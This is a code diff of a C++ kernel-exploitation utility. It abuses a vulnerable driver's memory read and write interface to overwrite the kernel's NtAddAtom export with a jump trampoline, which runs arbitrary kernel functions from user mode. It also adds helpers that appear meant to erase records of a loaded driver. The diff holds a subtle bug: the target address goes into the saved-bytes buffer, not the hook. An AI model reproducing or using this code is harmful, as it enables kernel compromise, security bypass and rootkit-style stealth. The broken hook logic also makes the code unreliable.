@@ -6,7 +6,6 @@
 #include <random>
 #include <Psapi.h>
 #include "vulndriver.h"
-#include "additional_nt.h"
 #define PAGE_SIZE 0x1000
 
 
@@ -58,8 +57,10 @@ namespace specific {
     PVOID FindPattern(PVOID StartingAddress, ULONG SearchLength, BYTE CheckAgainst[], const char* SearchMask);
     PVOID FindSectionOfKernelModule(const char* SectionName, PVOID HeadersPointer, ULONG* SectionSize);
     PVOID GetKernelModuleExport(HANDLE* DeviceHandle, PVOID ModuleBaseAddress, const char* ExportName);
-    BOOL HandleResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID FunctionResource, BOOL IsAcquire);
-    PVOID HandleElementGenericTable(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer, BOOL IsLookup);
+    bool ExReleaseResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID ResourceToRelease);
+    bool ExAcquireResourceExclusiveLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID ResourceToAcquire, BOOLEAN ShouldWait);
+    PVOID RtlLookupElementGenericTableAvl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer);
+    BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer);
     BOOL HandleExFreePool(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID PoolAddress);
     NTSTATUS HandleNtQuerySystemInformation(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SYSTEM_INFORMATION_CLASS SystemInformationClass,
         PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
@@ -84,22 +85,23 @@ namespace allocations {
 
 
 template<typename RetType, typename ...Args>
-BOOL CallKernelFunction(HANDLE* DeviceHandle, RetType* FunctionResult, PVOID FunctionAddress,
+bool CallKernelFunction(HANDLE* DeviceHandle, RetType* FunctionResult, PVOID FunctionAddress,
     PVOID KernelBaseAddress, const Args ...FunctionArguments) {
     HMODULE NtDll = GetModuleHandleA("ntdll.dll");
     PVOID NtAddAtom = NULL;
     PVOID NtAddAtomExport = NULL;
-    BYTE TrampolineHook[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, FunctionAddress
-                          0x41, 0xff, 0xe5 };  // jmp r13 (FunctionAddress)
-    BYTE OriginalFunctionData[sizeof(TrampolineHook)] = {0};
-    RtlCopyMemory(&TrampolineHook[2], &FunctionAddress, sizeof(PVOID));
+    const ULONG HookSize = 12;
+    BYTE TrampolineHook[HookSize] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, FunctionAddress
+                          0xff, 0xe0 };  // jmp rax (FunctionAddress)
+    BYTE OriginalFunctionData[HookSize] = { 0 };
+    *(PVOID*)&OriginalFunctionData[2] = FunctionAddress;
 
 
     // Check if return type is void:
-    constexpr BOOL IsReturnVoid = std::is_same_v<RetType, void>;
+    constexpr auto IsReturnVoid = std::is_same_v<RetType, void>;
     if constexpr (!IsReturnVoid) {
         if (FunctionResult == NULL) {
-            return FALSE;
+            return false;
         }
     }
     else {
@@ -109,44 +111,40 @@ BOOL CallKernelFunction(HANDLE* DeviceHandle, RetType* FunctionResult, PVOID Fun
 
     // Get handle to ntdll.dll:
     if (NtDll == NULL) {
-        return FALSE;
+        return false;
     }
 
 
     // Get address of NtAddAtom to abuse:
     NtAddAtom = (PVOID)GetProcAddress(NtDll, "NtAddAtom");
     if (NtAddAtom == NULL) {
-        return FALSE;
+        return false;
     }
 
 
     // Get the kernel export of NtAddAtom itself:
     NtAddAtomExport = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "NtAddAtom");
     if (NtAddAtomExport == NULL) {
-        return FALSE;
+        return false;
     }
 
 
     // Read the original data from the export into a saved buffer:
-    if (OriginalFunctionData == NULL) {
-        return FALSE;  // Cannot save original data
-    }
-    if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, NtAddAtomExport, &OriginalFunctionData, sizeof(TrampolineHook))) {
-        return FALSE;  // Cannot save original data
+    if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, NtAddAtomExport, &OriginalFunctionData, HookSize)) {
+        return false;  // Cannot save original data
     }
 
 
     // Check if the kernel export is already hooked:
     if (OriginalFunctionData[0] == TrampolineHook[0] && OriginalFunctionData[1] == TrampolineHook[1] &&
-        OriginalFunctionData[sizeof(TrampolineHook) - 2] == TrampolineHook[sizeof(TrampolineHook) - 2] &&
-        OriginalFunctionData[sizeof(TrampolineHook) - 1] == TrampolineHook[sizeof(TrampolineHook) - 1] &&
-        OriginalFunctionData[sizeof(TrampolineHook) - 3] == TrampolineHook[sizeof(TrampolineHook) - 3]) {
-        return FALSE;  // Function is already hooked, movabs and jmp are installed
+        OriginalFunctionData[HookSize - 2] == TrampolineHook[HookSize - 2] &&
+        OriginalFunctionData[HookSize - 1] == TrampolineHook[HookSize - 1]){
+        return false;  // Function is already hooked, movabs and jmp are installed
     }
 
 
     // Hook the NtAddAtom export and run the trampoline hook when called:
-    if (!specific::WriteToReadOnlyMemory(DeviceHandle, NtAddAtomExport, &TrampolineHook, sizeof(TrampolineHook))) {
+    if (!specific::WriteToReadOnlyMemory(DeviceHandle, NtAddAtomExport, &TrampolineHook, HookSize)) {
         return FALSE;
     }
 
@@ -167,5 +165,5 @@ BOOL CallKernelFunction(HANDLE* DeviceHandle, RetType* FunctionResult, PVOID Fun
 
 
     // Restore original data from NtAddAtom:
-    return specific::WriteToReadOnlyMemory(DeviceHandle, NtAddAtomExport, OriginalFunctionData, sizeof(TrampolineHook));
+    return specific::WriteToReadOnlyMemory(DeviceHandle, NtAddAtomExport, OriginalFunctionData, HookSize);
 }
